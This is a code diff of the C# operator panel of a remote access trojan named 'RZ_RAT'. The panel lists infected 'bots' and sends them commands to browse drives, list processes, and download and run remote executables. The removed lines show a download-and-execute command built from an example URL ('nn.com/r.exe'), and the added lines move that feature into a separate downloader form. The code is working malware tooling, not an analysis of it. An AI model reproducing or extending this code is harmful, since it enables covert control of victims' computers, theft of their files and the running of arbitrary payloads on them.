@@ -4,10 +4,13 @@ using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Binary;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
@@ -17,8 +20,6 @@ namespace RZ_RAT
     public partial class Form1 : Form
     {
         public static Server ServerObject = null;
-        public FileManger FM = new FileManger();
-        public ProcessForm PS = new ProcessForm();
         public Form1()
         {
             InitializeComponent();
@@ -39,10 +40,8 @@ namespace RZ_RAT
                 port = 4562;
             }
             label1.Text = "Port : " + port;
-            ServerObject = new Server(port,this, FM,PS);
+            ServerObject = new Server(port,this);
             new Thread(new ThreadStart((MethodInvoker)delegate { ServerObject.Strat(); })).Start();
-            timer1.Enabled = true;
-            
         }
         public static string ShowDialog(string text, string caption)
         {
@@ -55,7 +54,7 @@ namespace RZ_RAT
                 StartPosition = FormStartPosition.CenterScreen
             };
             Label textLabel = new Label() { Left = 50, Top = 20, Text = text };
-            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 400 };
+            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 400 ,Text = "4562" };
             Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 70, DialogResult = DialogResult.OK };
             confirmation.Click += (sender, e) => { prompt.Close(); };
             prompt.Controls.Add(textBox);
@@ -65,10 +64,7 @@ namespace RZ_RAT
 
             return prompt.ShowDialog() == DialogResult.OK ? textBox.Text : "";
         }
-        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
-        {
-        }
-
+   
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             System.Environment.Exit(0);
@@ -76,67 +72,69 @@ namespace RZ_RAT
 
         private void msgboxToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;
-
+            ListView.SelectedListViewItemCollection breakfast = Form1.ServerObject.Context.listView1.SelectedItems;
             foreach (ListViewItem item in breakfast)
             {
-                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
-                                 .Select(x => x.ToString())
-                                 .ToArray();
-             ServerObject.addCommand(ss, "getDrivers");
-             FM.Show();
+                int index_ = (int)item.Tag;
+                ServerObject.ClientsObjs[index_].FM = new FileManger(index_);
+                ServerObject.ClientsObjs[index_].addCommand("harddrives");
+                ServerObject.ClientsObjs[index_].FM.Show();
             }
         }
-
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            label2.Text = "Bots : " + ServerObject.infoClients.Count;
-            foreach (ListViewItem lv in listView1.Items)
-            {
-                string[] ss = ((IEnumerable)lv.Tag).Cast<object>()
-                                 .Select(x => x.ToString())
-                                 .ToArray();
-
-                if (ServerObject.GetTimestamp() - int.Parse(ss[1]) > 10)
-                {
-                    var client = ServerObject.infoClients.Where(d => d[0] == ss[0]).FirstOrDefault();
-                    if (client != null) { ServerObject.infoClients.Remove(client); }
-                    lv.Remove();
-                }
-            }
-            label3.Text = "Selected : "+listView1.SelectedItems.Count.ToString();
-        }
-
         private void processListToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;
-
+            ListView.SelectedListViewItemCollection breakfast = Form1.ServerObject.Context.listView1.SelectedItems;
             foreach (ListViewItem item in breakfast)
             {
-                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
-                                 .Select(x => x.ToString())
-                                 .ToArray();
-                ServerObject.addCommand(ss, "processlist");
-                PS.Show();
+                int index_ = (int)item.Tag;
+                ServerObject.ClientsObjs[index_].PF = new ProcessForm(index_);
+                ServerObject.ClientsObjs[index_].addCommand("processlist");
+                ServerObject.ClientsObjs[index_].PF.Show();
             }
-        }
+        } // process get command
 
         private void downExecToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //dowwwnexec
-            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;
-
-            foreach (ListViewItem item in breakfast)
-            {
-                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
-                                 .Select(x => x.ToString())
-                                 .ToArray();
-                string[] url = ShowDialog("url : ( http://nn.com/r.exe$$temp.exe ) ", "Downloader").Split(new string[] { "$$" }, StringSplitOptions.None) ;
-                ServerObject.addCommand(ss, "dowwwnexec<<>>" + url[0] + "<<>>" + url[1]);
-                
-            }
+            new Downloader().Show();
+        } // download command
+        #region about me
+        private void label5_MouseHover(object sender, EventArgs e)
+        {
+            label5.ForeColor = Color.Red;
         }
 
+        private void label5_MouseLeave(object sender, EventArgs e)
+        {
+            label5.ForeColor = Color.Blue;
+        }
+
+        private void label5_Click(object sender, EventArgs e)
+        {
+            new AboutBox1().ShowDialog();
+        }
+        #endregion
+        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            try
+            {
+                label4.Text = "Commands : " + ServerObject.ClientsObjs[(int)listView1.SelectedItems[0].Tag].commands.Count;
+            }
+            catch { label4.Text = "Commands : 0"; }
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+            string s = @"E:\مجلد جديد (2)\Documents\Visual Studio 2013\Projects\WindowsApplication5\bin\Debug";
+            
+           MessageBox.Show(s.Replace("\\" + s.Split('\\').Last(),""));
+
+        }
+
+        private void listView1_DoubleClick(object sender, EventArgs e)
+        {
+
+        }
+       
        
     }
 }
